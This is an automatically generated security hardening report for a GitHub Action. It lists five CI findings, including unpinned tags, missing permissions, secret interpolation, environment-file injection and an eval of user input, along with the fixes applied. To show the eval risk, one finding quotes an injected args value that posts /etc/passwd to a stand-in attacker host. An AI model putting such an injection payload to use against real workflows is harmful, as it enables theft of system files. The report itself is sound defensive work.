<!-- markdownlint-disable -->

# Hardening Report: actions-hub--gcloud/577.0.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **actions-hub--gcloud/577.0.0** was hardened automatically. 5 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### unpinned-uses (severity: high)

Workflow files reference actions by mutable tag instead of a pinned 40-character commit SHA. In test.yaml, `actions/checkout@v2` is used in all four jobs. In upgrader.yaml, `actions/create-release@v1` is used. These tags can be moved to point at different (potentially malicious) commits at any time.

Locations:

- `.github/workflows/test.yaml:9`
- `.github/workflows/test.yaml:22`
- `.github/workflows/test.yaml:35`
- `.github/workflows/test.yaml:48`
- `.github/workflows/upgrader.yaml:65`

### permissions (severity: medium)

Neither test.yaml nor upgrader.yaml defines a top-level `permissions:` key, and no job within either file defines its own `permissions:` block. This means workflows run with the default (broad) repository permissions, violating the principle of least privilege.

Locations:

- `.github/workflows/test.yaml:1`
- `.github/workflows/upgrader.yaml:1`

### script-injection (severity: high)

Rule (a): `${{ secrets.GH_TOKEN }}` is interpolated directly inside `run:` shell command strings in upgrader.yaml. In the 'Checkout repo' step (line 12): `git config --global url."https://${{ secrets.GH_TOKEN }}:@github.com/"...` and in the 'Modify Dockerfile' step (line 63): same pattern. Any `${{ ... }}` expression embedded directly in a run block is subject to YAML template substitution before the shell sees it, enabling injection if the value contains shell metacharacters.

Locations:

- `.github/workflows/upgrader.yaml:12`
- `.github/workflows/upgrader.yaml:63`

### github-env-injection (severity: high)

In upgrader.yaml, the 'Check if new version exist' step fetches SDK_VERSION from an external Docker Hub API response and LATEST_VERSION from the GitHub releases API, then writes them to $GITHUB_ENV and $GITHUB_OUTPUT without sanitization (no `printf '%s' ... | tr -d '\n\r'` step). A malicious or compromised API response containing newlines could inject arbitrary environment variables or output values. Affected lines: `echo "SDK_VERSION=${SDK_VERSION}" >> $GITHUB_ENV`, `echo "LATEST_VERSION=${LATEST_VERSION}" >> $GITHUB_ENV`, and `echo "newest=yes" >> $GITHUB_OUTPUT`.

Locations:

- `.github/workflows/upgrader.yaml:33`
- `.github/workflows/upgrader.yaml:34`
- `.github/workflows/upgrader.yaml:35`

### suspicious-run-content (severity: high)

eval-dynamic: entrypoint.sh uses `eval "$command $*"` where `$*` expands to all positional arguments passed to the Docker entrypoint — which are directly derived from the user-supplied `args` input of the action. This allows an attacker to inject arbitrary shell commands via the `args` input (e.g., `args: 'info; curl -d @/etc/passwd http://evil.com'`). The pattern matches `eval` with a shell-variable expansion of user-controlled data.

Locations:

- `entrypoint.sh:79`

## Iteration Notes

### Iteration 1

**Fixes applied:** unpinned-uses, permissions, script-injection, github-env-injection, suspicious-run-content

**Notes:**

Fixed all 5 findings:
1. unpinned-uses: Pinned actions/checkout@v2 → @0717577d45739eb3c851188b29f50ed6c0b2194e in test.yaml (4 occurrences) and actions/create-release@v1 → @0cb9c9b65d5d1901c1f53e5e66eaf4afd303e70e in upgrader.yaml.
2. permissions: Added `permissions: {}` top-level to both test.yaml and upgrader.yaml; added `permissions: contents: write` at the job level in upgrader.yaml (needed for git push and release creation).
3. script-injection: Moved both `${{ secrets.GH_TOKEN }}` expressions in upgrader.yaml run blocks into step-level `env:` blocks as GH_TOKEN, referenced as ${GH_TOKEN} in shell.
4. github-env-injection: Sanitized SDK_VERSION, LATEST_VERSION, and tag values with `printf '%s' ... | tr -d '\n\r'` before writing to $GITHUB_ENV/$GITHUB_OUTPUT.
5. suspicious-run-content: Replaced `eval "$command $*"` with `"$command" "$@"` in entrypoint.sh to eliminate shell injection via user-controlled args.

